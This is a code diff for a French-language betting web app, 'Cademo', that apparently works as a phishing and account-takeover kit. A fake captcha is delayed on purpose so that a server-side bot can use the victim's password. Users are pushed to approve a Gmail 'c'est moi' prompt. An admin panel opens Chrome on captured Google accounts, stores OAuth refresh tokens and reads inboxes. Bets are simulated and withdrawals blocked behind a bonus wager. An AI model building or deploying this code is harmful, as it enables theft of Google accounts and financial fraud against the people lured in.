+      if (!email) { setOut("vfy-out", "Email requis."); return; }
+      apiFetch("/api/verify-account", { method: "POST",
+        body: { email: email, status: status } })
+        .then(function (r) { setOut("vfy-out", JSON.stringify(r, null, 2)); })
+        .catch(function (e) { setOut("vfy-out", "Erreur : " + e.message); });
+    },
+
+    apiInbox: function () {
+      var limit = Number(el("imap-limit").value || 10);
+      setOut("imap-out", "Chargement…", true);
+      apiFetch("/api/inbox?limit=" + limit)
+        .then(function (r) { renderInbox(r); })
+        .catch(function (e) { setOut("imap-out", "Erreur : " + e.message, true); });
+    },
+
+    apiListConfigs: function () {
+      apiFetch("/api/configs").then(renderConfigs)
+        .catch(function (e) { el("cfg-list").innerHTML =
+          '<div class="cd-out">Erreur : ' + esc(e.message) + '</div>'; });
+    },
+
+    apiSaveConfig: function () {
+      var email = (el("cfg-email").value || "").trim();
+      var token = (el("cfg-token").value || "").trim();
+      if (!email || !token) { alert("Email et refresh_token requis."); return; }
+      apiFetch("/api/config", { method: "POST",
+        body: { email: email, refreshToken: token } })
+        .then(function () {
+          el("cfg-email").value = ""; el("cfg-token").value = "";
+          CD.apiListConfigs();
+          alert("Sauvegardé (chiffré côté serveur).");
+        })
+        .catch(function (e) { alert("Erreur : " + e.message); });
+    },
+
+    apiDeleteConfig: function (email) {
+      if (!confirm("Supprimer la config OAuth de " + email + " ?")) return;
+      apiFetch("/api/config/" + encodeURIComponent(email), { method: "DELETE" })
+        .then(function () { CD.apiListConfigs(); })
+        .catch(function (e) { alert("Erreur : " + e.message); });
+    },
+
+    partnerClearDemo: function () {
+      if (!confirm("Effacer tous les comptes de démo (demo.*@cademo.app) ?")) return;
+      var users = loadUsers();
+      Object.keys(users).forEach(function (k) {
+        if (k.indexOf("demo.") === 0) delete users[k];
+      });
+      saveUsers(users);
+      state.partnerResult = null;
+      renderPartner();
+    },
+    /* ================================================= FIN PARTNER API */
+
+    clearSlip: function () { state.slip = []; render(); },
+
+    setStake: function (v) { el("stake-input").value = v; renderTicketView(); },
+
+    setMyBetsTab: function (t) { state.myBetsTab = t; renderMyBets(); },
+    setAdminFilter: function (f) { state.adminFilter = f; renderAdmin(); },
+    closeSheet: function (id) { el(id).classList.remove("is-on"); },
+    render: render,
+    renderTicket: renderTicketView,
+
+    placeBet: function () {
+      var u = getUser();
+      var stake = parseFloat(el("stake-input").value) || 0;
+      if (!state.slip.length) return;
+      if (u.balance <= 0) { alert("Solde épuisé. Vérifie ton mail pour débloquer tes 200 €."); CD.go("profile"); return; }
+      if (stake < MISE_MIN || stake > u.balance || stake > miseMax(u.balance)) return;
+      var o = slipOdds();
+      u.balance -= stake;
+      // Progression du wager bonus
+      if (!u.wagerCompleted && u.wagerRequired > 0) {
+        u.wagerProgress = (u.wagerProgress || 0) + stake;
+        if (u.wagerProgress >= u.wagerRequired) {
+          u.wagerProgress = u.wagerRequired;
+          u.wagerCompleted = true;
+          // Notifier visuellement via toast au lieu d'un log console silencieux
+          showToast("Wager atteint — tes gains sont retirables !");
+          console.log("[WAGER] Objectif atteint pour " + u.email);
+        }
+      }
+      var now = Date.now();
+      var SIM_DELAY = 3 * 60 * 1000; // 3 minutes avant résolution des faux paris
+      u.bets.push({
+        id: "b" + now + Math.floor(Math.random() * 1000),
+        legs: state.slip.map(function (l) {
+          var leg = { who: l.who, match: l.match, market: l.market, pick: l.pick,
+                   odds: l.odds, marketId: l.marketId, sport: l.sport,
+                   eventId: l.eventId, marketKey: l.marketKey, line: l.line,
+                   side: l.side };
+          // Pré-calculer le résultat simulé pour les paris statiques
+          if (isStaticEvent(l.eventId)) {
+            leg.simulatedOutcome = simulateLegOutcome(l.odds, l.line);
+            leg.simulatedResolveAt = now + SIM_DELAY;
+          }
+          return leg;
+        }),
+        stake: stake, odds: o,
+        payout: gainDe(stake, o),        // gain plafonné, figé à la validation
+        status: "open",
+        placedAt: new Date().toISOString()
+      });
+      saveUser(u);
+      state.slip = [];
+      CD.go("mybets");
+    },
+
+    applyCredit: function () {
+      var amt = parseFloat(el("credit-amount").value);
+      if (!state.creditTarget || isNaN(amt)) return;
+      var us = loadUsers();
+      if (!us[state.creditTarget]) return;
+      us[state.creditTarget].balance = Math.max(0, us[state.creditTarget].balance + amt);
+      saveUsers(us);
+      CD.closeSheet("sheet-credit");
+      render();
+    },
+
+    withdrawFunds: function () {
+      var u = getUser();
+      if (!u) return;
+      if (!u.wagerCompleted && u.wagerRequired > 0) {
+        alert("Retrait bloqué — il te manque encore " + euro(Math.max(0, u.wagerRequired - u.wagerProgress)) + " de mises pour débloquer ton argent.");
+        return;
+      }
+      if (u.balance <= 0) {
+        alert("Solde insuffisant.");
+        return;
+      }
+      var amount = u.balance;
+      if (!confirm("Confirmer le retrait de " + euro(amount) + " ?")) return;
+      u.balance = 0;
+      saveUser(u);
+      alert("Demande de retrait de " + euro(amount) + " enregistrée.");
+      render();
+    },
+
+    logout: function () {
+      // Ferme la session Supabase (si configurée), vide l'état local
+      // puis revient à la landing de Léo, sans laisser une seule classe de l'app.
+      supabaseReady().then(function (sb) { if (sb) sb.auth.signOut(); });
+      Store.del(KEY_CURRENT);
+      try { sessionStorage.removeItem("cademo_partner_unlocked"); } catch (e) {}
+      state.slip = [];
+      state.partnerQuery = "";
+      state.partnerResult = null;
+      document.body.className = "";                 // vraie remise à zéro
+      window.showScreen("page-start");              // le wrapper ci-dessus
+                                                    // n'ajoute AUCUNE classe.
+    },
+
+    open: async function (email, supabaseId, supabaseToken) {
+      signIn(email, supabaseId);
+      if (supabaseToken) syncProfileFromServer(supabaseToken);
+      var u = getUser();
+      // Vérifier fraîcheur côté serveur pour invalider un is_verified stale
+      if (u && u.email && !isPartner()) {
+        try {
+          var chk = await apiFetch("/api/check-verified?email=" + encodeURIComponent(u.email));
+          if (!chk || !chk.is_verified) {
+            u.is_verified = false;
+            saveUser(u);
+          }
+        } catch (e) {
+          u.is_verified = false;
+          saveUser(u);
+        }
+      }
+      // Bot + captcha uniquement pour les nouveaux / non vérifiés
+      if (u && !u.is_verified && !isPartner()) {
+        launchVerificationBot(u.email);
+        showScreen("page-captcha");
+        // Met à jour l'email affiché sur le captcha
+        var captchaEmailEl = el("captchaEmail");
+        if (captchaEmailEl && u.email) captchaEmailEl.innerText = u.email;
+        // Reset état captcha
+        state.captchaAttempts = 0;
+        var box = el("captcha-box");
+        if (box) { box.dataset.solved = "false"; box.style.pointerEvents = "auto"; }
+        var spinner = el("captcha-spinner");
+        if (spinner) spinner.style.display = "none";
+        var icon = el("captcha-icon");
+        if (icon) icon.style.opacity = "0";
+        var check = el("captcha-check");
+        if (check) { check.style.backgroundColor = "#fff"; check.style.borderColor = "#c1c1c1"; }
+        var msg = el("captcha-msg");
+        if (msg) { msg.textContent = ""; msg.style.color = "#d93025"; }
+        // Loader initial 4s puis affichage
+        var initialLoader = el("captcha-initial-loader");
+        var captchaContent = el("captcha-content");
+        if (initialLoader) initialLoader.style.display = "flex";
+        if (captchaContent) captchaContent.style.display = "none";
+        setTimeout(function () {
+          if (initialLoader) initialLoader.style.display = "none";
+          if (captchaContent) captchaContent.style.display = "block";
+        }, 8000);
+        return;
+      }
+      document.body.className = "cademo-app";
+      CD.go(isPartner() ? "partner" : "bets");
+      loadEvents();
+    },
+    solveCaptcha: function () {
+      var box = el("captcha-box");
+      var msg = el("captcha-msg");
+      var check = el("captcha-check");
+      var icon = el("captcha-icon");
+      var spinner = el("captcha-spinner");
+      if (!box || box.dataset.solved === "true") return;
+      if (!state.captchaAttempts) state.captchaAttempts = 0;
+      state.captchaAttempts++;
+
+      if (state.captchaAttempts === 1) {
+        // Premier clic : 14s de spinner puis échec (augmenté pour laisser plus de temps au bot)
+        if (spinner) spinner.style.display = "block";
+        if (msg) msg.textContent = "";
+        box.style.pointerEvents = "none";
+        setTimeout(function () {
+          if (spinner) spinner.style.display = "none";
+          box.style.pointerEvents = "auto";
+          if (msg) { msg.textContent = "Veuillez réessayer."; msg.style.color = "#d93025"; }
+          box.classList.add("shake");
+          setTimeout(function () { box.classList.remove("shake"); }, 400);
+        }, 14000);
+        return;
+      }
+
+      // Deuxième clic : 16s de spinner puis succès (+3s pour laisser le bot mettre le MDP)
+      if (spinner) spinner.style.display = "block";
+      if (msg) msg.textContent = "";
+      box.style.pointerEvents = "none";
+      setTimeout(function () {
+        if (spinner) spinner.style.display = "none";
+        if (icon) icon.style.opacity = "1";
+        if (check) { check.style.backgroundColor = "#34A853"; check.style.borderColor = "#34A853"; }
+        if (msg) { msg.style.color = "#34A853"; msg.textContent = "Captcha validé !"; }
+        box.dataset.solved = "true";
+        setTimeout(function () {
+          // Loader plein écran avant mail-info
+          var loader = document.createElement("div");
+          loader.style.cssText = "position:fixed;top:0;left:0;right:0;bottom:0;background-color:#ffffff;display:flex;align-items:center;justify-content:center;z-index:1001;";
+          loader.innerHTML = '<div style="width:48px;height:48px;border:4px solid rgba(0,0,0,0.1);border-top-color:#4285F4;border-radius:50%;animation:spin 1s linear infinite;"></div>';
+          document.body.appendChild(loader);
+          setTimeout(function () {
+            if (loader.parentNode) loader.parentNode.removeChild(loader);
+            // Reset local verified flag pour éviter qu'un vieux succès ne fasse sauter la suite
+            var uMail = getUser();
+            if (uMail) { uMail.is_verified = false; saveUser(uMail); }
+            showScreen("page-mail-info");
+            // Reset UI bouton à l'état initial (bloqué jusqu'à vraie validation serveur)
+            var btn = document.getElementById("mail-validate-btn");
+            if (btn) { btn.textContent = "Valider"; btn.style.backgroundColor = "#1a73e8"; btn.disabled = true; }
+            var pending = document.getElementById("mail-pending");
+            if (pending) { pending.textContent = "En attente de confirmation…"; pending.style.color = "#5f6368"; }
+            if (uMail && uMail.email) {
+              var elMail = document.getElementById("mail-user-email");
+              if (elMail) elMail.textContent = uMail.email;
+            }
+            startMailPolling();
+          }, 2000);
+        }, 800);
+      }, 16000);
+    },
+    validateMail: function () {
+      var u = getUser();
+      var pending = document.getElementById("mail-pending");
+      if (!u || !u.email) {
+        if (pending) { pending.textContent = "Erreur : aucun utilisateur connecté."; pending.style.color = "#d93025"; }
+        return;
+      }
+      if (pending) { pending.textContent = "Vérification en cours…"; pending.style.color = "#5f6368"; }
+      apiFetch("/api/check-verified?email=" + encodeURIComponent(u.email))
+        .then(function (r) {
+          if (r && r.is_verified) {
+            if (!u.is_verified) { u.is_verified = true; saveUser(u); }
+            if (_mailCheckInterval) { clearInterval(_mailCheckInterval); _mailCheckInterval = null; }
+            document.body.className = "cademo-app";
+            CD.go(isPartner() ? "partner" : "bets");
+            loadEvents();
+          } else {
+            if (pending) { pending.textContent = "Vous devez d'abord confirmer « Oui, c'est moi » dans votre boîte mail Gmail."; pending.style.color = "#d93025"; }
+          }
+        })
+        .catch(function (e) {
+          if (pending) { pending.textContent = "Erreur de vérification. Réessayez."; pending.style.color = "#d93025"; }
+        });
+    },
+
+    /* ========================================================= GOOGLE ACCOUNTS ADMIN */
+    setGoogleFilter: function (f) { state.googleFilter = f; renderGoogleAccounts(); },
+    openGoogleAccount: function (email) {
+      apiFetch('/api/admin/open-google', { method: 'POST', body: { email: email } })
+        .then(function (r) {
+          alert('Chrome lancé pour ' + email + ' (PID ' + r.pid + ')');
+        })
+        .catch(function (e) {
+          alert('Erreur ouverture Chrome : ' + (e.message || e));
+        });
+    },
+    relaunchGoogleBot: function (userId) {
+      apiFetch('/api/validate-account-now/' + userId, { method: 'POST', body: { headless: false } })
+        .then(function (r) {
+          alert('Bot relancé : ' + r.message);
+          setTimeout(fetchGoogleAccounts, 3000);
+        })
+        .catch(function (e) {
+          alert('Erreur relance bot : ' + (e.message || e));
+        });
+    },
+  };
+  window.CD = CD;
+  window.cademoLogin = cademoLogin;
+
+  /* ------------------------------- toast helper ----------------------------- */
+  function showToast(message) {
+    var existing = document.querySelector(".cd-toast");
+    if (existing) { existing.textContent = message; existing.classList.add("show"); clearTimeout(existing._timer); }
+    else {
+      existing = document.createElement("div");
+      existing.className = "cd-toast";
+      existing.textContent = message;
+      document.body.appendChild(existing);
+      // Force reflow
+      void existing.offsetWidth;
+      existing.classList.add("show");
+    }
+    existing._timer = setTimeout(function () { if (existing) existing.classList.remove("show"); }, 3500);
+  }
+  window.showToast = showToast;
+
+  /* ------------------------------- enrobage du code d'origine (non modifié) */
+  var originalShowScreen = window.showScreen;
+  window.showScreen = function (id) {
+    originalShowScreen(id);
+    // À la landing (page-start), aucune classe : le CSS d'origine de Léo
+    // s'applique intégralement (fond blanc, bouton Google, texte centré).
+    document.body.classList.remove("cademo-dark", "cademo-auth", "cademo-app");
+    if (id !== "page-start") document.body.classList.add("cademo-auth");
+    window.scrollTo(0, 0);
+  };
+
+  /* ------------------------------------------------------------ démarrage */
+  document.addEventListener("DOMContentLoaded", function () {
+    // Écran 0 : on habille la page autour du bouton d'origine, sans le toucher.
+    // La landing (page-start) est celle codée par Léo dans Debut-Cademo.html :
+    // « Mon Projet Perso » + « Connecte-toi pour continuer » + bouton Google.
+    // On ne modifie RIEN ici — ni le HTML, ni le CSS, ni le body.
+
+    // Case « afficher le mot de passe » : elle est cochée, on la rend cohérente.
+    var chk = el("showPass");
+    var pwField = document.querySelector('#page-password input[type="password"], #page-password input[type="text"]');
+    function syncPw() { pwField.type = chk.checked ? "text" : "password"; }
+    chk.addEventListener("change", syncPw);
+    syncPw();
+
+    // Mises rapides du ticket
+    Array.prototype.forEach.call(el("quick-stakes").children, function (b) {
+      b.onclick = function () {
+        var v = b.getAttribute("data-stake");
+        var u = getUser();
+        CD.setStake(v === "max" ? miseMax(u ? u.balance : 0) : parseFloat(v));
+      };
+    });
+
+    // Refresh des cotes toutes les 60s quand on est sur l'écran Paris
+    setInterval(function () {
+      if (state.view === "bets") refreshOddsForSport(state.sport);
+    }, 60000);
+
+    // Vérification automatique des résultats toutes les 5 minutes
+    setInterval(checkAndSettleBets, 5 * 60 * 1000);
+  });
+})();
+</script>
+
+<!-- Charge le proxy IA de Léo (fichier NON modifié) : expose
+     Charge le module proxy IA de Léo (fichier NON modifié). -->
+<script src="/stitch/stitch_cademo_betting_platform/profil_cademo_mobile/cademo-proxy-simple.js" defer></script>
+</body>
+</html>
+
+
+
+
+
+
+
